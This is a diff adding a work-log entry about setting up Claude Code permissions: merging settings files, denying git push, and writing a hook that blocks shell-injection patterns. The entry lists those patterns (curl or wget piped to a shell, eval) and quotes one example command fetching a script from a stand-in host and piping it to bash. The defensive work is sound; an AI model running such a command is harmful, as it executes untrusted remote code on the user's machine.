@@ -4,6 +4,37 @@ A running record of work done, files modified, and decisions made across Claude 
 
 ---
 
+## 2026-05-14 — `permission-hooks-setup`
+
+### Goal
+Consolidate Claude Code permission settings from settings.local.json into the project settings.json and add a PreToolUse shell-injection guard hook.
+
+### What we did
+- Ran `/fewer-permission-prompts` skill: scanned 50 JSONL transcripts, extracted Bash + MCP tool-call frequencies; identified `kubectl get *`, `kubectl logs *`, `talosctl get *`, `flux get *`, and 4 kubernetes MCP tools as high-value allowlist candidates
+- Discovered initial `settings.json` entries lacked the required `Bash()` wrapper — Claude Code permission rules are tool-namespaced; bare strings like `"kubectl get *"` are silently ignored by the harness
+- User revealed `.claude/settings.local.json` (gitignored, schema-unvalidated); merged its full content into `.claude/settings.json` (checked-in, schema-validated project file)
+- Audited merged allowlist: removed 7 redundant entries where narrower rules were shadowed by broader ones (e.g. `Bash(talosctl get *)` covered by `Bash(talosctl *)`, four specific KUBECONFIG+kubectl exact commands covered by the wildcard form)
+- Added `Bash(git push *)` to `permissions.deny` inside `permissions`; schema validation caught first attempt placing it at the wrong top-level scope
+- Cleared `settings.local.json` to `{}`; all config now consolidated in the checked-in `settings.json`
+- Created `.claude/hooks/check-shell-injection.sh`: PreToolUse hook detecting 4 injection patterns — pipe to shell interpreter, `eval`, curl/wget piped to shell, `source /dev/stdin`; uses `{"continue":false,"stopReason":"..."}` JSON protocol matching the existing SOPS hook
+- Hook suggests a ready-to-paste allowlist entry (`"Bash(<command>)"`) when blocking so the user can permanently allow a specific command if intentional
+- Added allowlist-bypass logic: discovered broad wildcards (e.g. `Bash(curl *)`) would silently bypass injection checks; fixed to exact-match-only so wildcards reduce prompts without granting blanket trust through the guard
+- Wired hook into `settings.json` PreToolUse Bash hooks array; ran 4-case test suite — all passed after fixing a `\-` typo in the test that produced invalid JSON
+
+### Files changed
+| File | Change |
+|------|--------|
+| `.claude/settings.json` | Created; merged from settings.local.json; removed 7 redundant allow entries; added `deny: [Bash(git push *)]`; wired shell-injection hook |
+| `.claude/settings.local.json` | Cleared to `{}` |
+| `.claude/hooks/check-shell-injection.sh` | Created; PreToolUse guard for 4 shell injection patterns with exact-match allowlist bypass and allowlist-entry suggestion on block |
+
+### Key decisions
+- `Bash()` wrapper is required — without it entries are silently ignored; non-obvious from casual reading of the settings schema
+- Hook allowlist bypass uses exact-match only, not wildcards — `Bash(curl *)` in the allow list would have silently passed `curl https://evil.sh | bash`; exact-match-only prevents broad wildcards from defeating injection checks
+- Permission system is a friction/convenience layer, not a security sandbox — hooks are the actual enforcement mechanism; both layers serve different purposes
+
+---
+
 ## 2026-05-14 — `cluster-variables-research`
 
 ### Goal
